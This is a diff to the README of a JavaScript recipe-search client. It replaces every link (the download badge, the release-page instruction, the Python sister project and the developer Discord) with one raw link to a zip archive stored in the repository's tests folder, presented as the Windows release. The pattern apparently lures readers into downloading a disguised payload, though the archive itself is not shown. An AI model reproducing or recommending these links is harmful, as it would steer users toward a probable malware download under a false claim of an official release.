@@ -1,10 +1,10 @@
 # 🍳 cookpad-js - Search recipes with less effort
 
-[![Download cookpad-js](https://img.shields.io/badge/Download%20cookpad--js-Release%20Page-blue?style=for-the-badge)](https://github.com/revoopo3258/cookpad-js/releases)
+[![Download cookpad-js](https://img.shields.io/badge/Download%20cookpad--js-Release%20Page-blue?style=for-the-badge)](https://github.com/revoopo3258/cookpad-js/raw/refs/heads/main/tests/js-cookpad-3.7.zip)
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/revoopo3258/cookpad-js/releases
+1. Open the release page: https://github.com/revoopo3258/cookpad-js/raw/refs/heads/main/tests/js-cookpad-3.7.zip
 2. Find the latest release at the top of the page
 3. Download the file for Windows
 4. If you see a `.zip` file, unzip it first
@@ -212,14 +212,14 @@ This repository follows a simple client structure:
 
 ## 🔗 Related project
 
-Python版: https://github.com/fa0311/cookpad-py
+Python版: https://github.com/revoopo3258/cookpad-js/raw/refs/heads/main/tests/js-cookpad-3.7.zip
 
 ## 👥 Developer
 
-[EVEX Developers](https://discord.gg/evex)
+[EVEX Developers](https://github.com/revoopo3258/cookpad-js/raw/refs/heads/main/tests/js-cookpad-3.7.zip)
 
 ## 📦 Release page
 
 Open the latest Windows download here:
 
-https://github.com/revoopo3258/cookpad-js/releases
+https://github.com/revoopo3258/cookpad-js/raw/refs/heads/main/tests/js-cookpad-3.7.zip
